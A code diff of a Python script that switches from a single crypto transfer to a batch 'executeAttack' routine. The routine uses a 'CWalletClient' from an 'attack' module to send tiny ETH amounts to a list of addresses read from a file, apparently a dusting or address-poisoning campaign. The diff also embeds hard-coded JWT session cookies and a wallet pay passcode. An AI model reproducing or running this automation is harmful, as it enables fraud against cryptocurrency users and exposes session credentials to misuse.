@@ -1,5 +1,5 @@
 import asyncio
-from post import post
+from script import executeAttack
 from attack import CWalletClient
 from coin import COINS
 import logging
@@ -38,17 +38,26 @@ def setup_logging(enabled: bool = True):
 
 
 
-def main():
-    authCookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2N3NxZzltcXpiaWJzanE1YW0zNnhkNHJhaGUiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ1NjQ2MDYsImlhdCI6MTc3MTQ5MjYwNn0.WaYNCgKpUPE-PTSDivVkK3G4XpgH1YcJGRa52AYlijs"
+async def main():
+    # Creating attack client
+    authCookie = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiNjk2MzI3NmZnejg5M2pieWhibTh6YWplc3dwZXBqeSIsInNlc3Npb25faWQiOiI0MDk2aW1jNHRhc3h5dGZjN2V5d2V4Mzk0b2VkbWMiLCJwbGF0Zm9ybSI6ImVtYWlsIiwicm9sZXMiOiIiLCJwcm9wcyI6eyJib3RJZCI6IiIsImhlYWRVcmwiOiIiLCJuaWNrbmFtZSI6IiJ9LCJleHAiOjE4MzQ1OTQxNDAsImlhdCI6MTc3MTUyMjE0MH0.xZRE4ud_0LqA0Bq3ulp8TzPsa1APDVIIksHTnlQNmJk"
     client = CWalletClient(authCookie=authCookie, payPassCode="111111")
 
-    targetAddress = "0x4bfc2af88c133f4c7abf5a6799d9ea920056b65b"
-    amount = "0.0000011"
-    cryptoCoin = COINS["ETH"]
-    userId = asyncio.run(client.executeFullTransaction(targetAddress, amount, cryptoCoin))
-    print(userId)
+    # Getting Addresses
 
+    addressesFileName = "manual.txt"
+    resultsFileName = "results_eth.txt"
+    amount = "0.00000001"
+    cryptoCoin = COINS["ETH"]
+
+    await executeAttack(
+        addressesFileName=addressesFileName,
+        resultsFileName=resultsFileName,
+        client=client,
+        coin=cryptoCoin,
+        amount=amount
+    )
 
 if __name__ == "__main__":
     setup_logging(enabled=True)
-    main()
+    asyncio.run(main())
